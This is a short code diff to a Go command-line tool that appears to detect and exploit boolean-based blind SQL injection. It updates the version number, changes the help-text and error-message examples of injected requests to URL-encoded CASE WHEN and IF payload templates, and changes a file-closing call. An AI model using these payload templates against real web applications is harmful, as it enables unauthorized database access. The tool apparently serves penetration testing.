@@ -19,7 +19,7 @@ import (
 )
 
 var (
-	version = "1.0.0"
+	version = "1.1.0"
 
 	generalOptionsHelp = `General Options:
   -o, -output <file>       Output file path (markdown format)
@@ -162,7 +162,7 @@ The request file MUST contain an injection marker. The marker should be placed
 where the boolean result changes the server response (i.e. CASE WHEN or IF).
 
 Example requests with marker:
-  GET /product?q='+(SELECT+CASE+WHEN+(<INJECT>)+THEN+'apple'+ELSE+'banana'+END)+' HTTP/1.1
+  GET /product?q='%%2B(SELECT+CASE+WHEN+(<INJECT>)+THEN+'apple'+ELSE+'banana'+END)%%2B' HTTP/1.1
   Host: target
 
   GET /users/?id=apple'AND+IF(<INJECT>,true,false)+AND'z'='z&Submit=Submit HTTP/1.1
@@ -282,7 +282,7 @@ func runExploit(config ExploitConfig) {
 	if req.MarkerPosition == -1 {
 		ui.Error("No injection marker found in request file!")
 		ui.Info("Add a marker (<PAYLOAD>, <FUZZ>, or <INJECT>) where the boolean condition should be injected.")
-		ui.Info("Example: id=1'+CASE+WHEN+(<PAYLOAD>)+THEN+1+ELSE+2+END--")
+		ui.Info("Example: id='%%2B(SELECT+CASE+WHEN+(<INJECT>)+THEN+'apple'+ELSE+'banana'+END)%%2B'")
 		os.Exit(1)
 	}
 
@@ -482,7 +482,7 @@ func runDetect(config DetectConfig) {
 		ui.Error("Failed to create output file: %v", err)
 		os.Exit(1)
 	}
-	defer writer.Close()
+	defer writer.CloseAndCleanup()
 
 	// Write custom headers to output if any
 	if len(config.Headers) > 0 {
